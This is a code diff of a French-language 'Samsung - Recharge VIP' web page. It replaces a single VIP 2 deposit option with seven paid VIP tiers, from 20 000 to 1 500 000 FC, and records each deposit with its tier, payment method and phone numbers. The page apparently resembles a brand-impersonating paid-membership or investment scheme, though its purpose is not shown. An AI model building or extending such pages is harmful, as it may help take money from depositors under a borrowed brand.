@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Samsung - Recharge</title>
+    <title>Samsung - Recharge VIP</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * {
@@ -60,7 +60,7 @@
             color: #004080;
         }
 
-        /* Grille des montants VIP 2 */
+        /* Grille des montants VIP */
         .amount-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
@@ -265,38 +265,42 @@
 
     <div class="top-header">
         <a href="profil.html" class="back-btn"><i class="fas fa-arrow-left"></i></a>
-        <div class="brand-title">Samsung - Recharge VIP 2</div>
+        <div class="brand-title">Samsung - Recharge VIP</div>
     </div>
 
     <div class="container">
 
         <div class="section-title">
-            <i class="fas fa-layer-group"></i> 1. Choisissez le montant VIP 2
+            <i class="fas fa-layer-group"></i> 1. Choisissez le montant du VIP
         </div>
         <div class="amount-grid">
-            <div class="amount-card selected" onclick="selectAmount(this, 20000)">
-                <div class="amount-label">VIP 2 - Option 1</div>
+            <div class="amount-card selected" onclick="selectAmount(this, 20000, 'VIP 1')">
+                <div class="amount-label">VIP 1</div>
                 <div class="amount-price">20 000 FC</div>
             </div>
-            <div class="amount-card" onclick="selectAmount(this, 40000)">
-                <div class="amount-label">VIP 2 - Option 2</div>
-                <div class="amount-price">40 000 FC</div>
-            </div>
-            <div class="amount-card" onclick="selectAmount(this, 80000)">
-                <div class="amount-label">VIP 2 - Option 3</div>
+            <div class="amount-card" onclick="selectAmount(this, 80000, 'VIP 2')">
+                <div class="amount-label">VIP 2</div>
                 <div class="amount-price">80 000 FC</div>
             </div>
-            <div class="amount-card" onclick="selectAmount(this, 150000)">
-                <div class="amount-label">VIP 2 - Option 4</div>
+            <div class="amount-card" onclick="selectAmount(this, 150000, 'VIP 3')">
+                <div class="amount-label">VIP 3</div>
                 <div class="amount-price">150 000 FC</div>
             </div>
-            <div class="amount-card" onclick="selectAmount(this, 300000)">
-                <div class="amount-label">VIP 2 - Option 5</div>
+            <div class="amount-card" onclick="selectAmount(this, 300000, 'VIP 4')">
+                <div class="amount-label">VIP 4</div>
                 <div class="amount-price">300 000 FC</div>
             </div>
-            <div class="amount-card" onclick="selectAmount(this, 500000)">
-                <div class="amount-label">VIP 2 - Option 6</div>
+            <div class="amount-card" onclick="selectAmount(this, 500000, 'VIP 5')">
+                <div class="amount-label">VIP 5</div>
                 <div class="amount-price">500 000 FC</div>
+            </div>
+            <div class="amount-card" onclick="selectAmount(this, 700000, 'VIP 6')">
+                <div class="amount-label">VIP 6</div>
+                <div class="amount-price">700 000 FC</div>
+            </div>
+            <div class="amount-card" style="grid-column: span 2;" onclick="selectAmount(this, 1500000, 'VIP 7')">
+                <div class="amount-label">VIP 7</div>
+                <div class="amount-price">1 500 000 FC</div>
             </div>
         </div>
 
@@ -341,7 +345,7 @@
             </div>
 
             <button class="btn-submit" onclick="submitRecharge()">
-                Soumettre la recharge VIP 2
+                Soumettre la recharge
             </button>
         </div>
 
@@ -367,16 +371,18 @@
         const userPhone = localStorage.getItem('userPhone') || '890000000';
 
         let selectedAmount = 20000;
+        let selectedVipLevel = "VIP 1";
         let selectedMethod = "";
         let recipientPhone = "";
 
         // Auto-remplir le numéro expéditeur
         document.getElementById('payPhone').value = userPhone;
 
-        function selectAmount(element, amount) {
+        function selectAmount(element, amount, vipLevel) {
             document.querySelectorAll('.amount-card').forEach(card => card.classList.remove('selected'));
             element.classList.add('selected');
             selectedAmount = amount;
+            selectedVipLevel = vipLevel;
         }
 
         function selectMethod(element, method, targetPhone) {
@@ -404,7 +410,7 @@
             const transactionId = document.getElementById('transactionId').value.trim();
 
             if (selectedAmount === 0) {
-                alert("Veuillez sélectionner un montant VIP 2.");
+                alert("Veuillez sélectionner un montant VIP.");
                 return;
             }
 
@@ -426,7 +432,7 @@
             try {
                 const depositRecord = {
                     amount: selectedAmount,
-                    vipLevel: "VIP 2",
+                    vipLevel: selectedVipLevel,
                     method: selectedMethod,
                     senderPhone: senderPhone,
                     recipientPhone: recipientPhone,
@@ -441,7 +447,7 @@
                     body: JSON.stringify(depositRecord)
                 });
 
-                alert(`Demande VIP 2 soumise avec succès ! Votre recharge de ${selectedAmount.toLocaleString('fr-FR')} FC (ID : ${transactionId}) est en cours de vérification.`);
+                alert(`Demande ${selectedVipLevel} soumise avec succès ! Votre recharge de ${selectedAmount.toLocaleString('fr-FR')} FC (ID : ${transactionId}) est en cours de vérification.`);
                 window.location.href = "profil.html";
 
             } catch (err) {
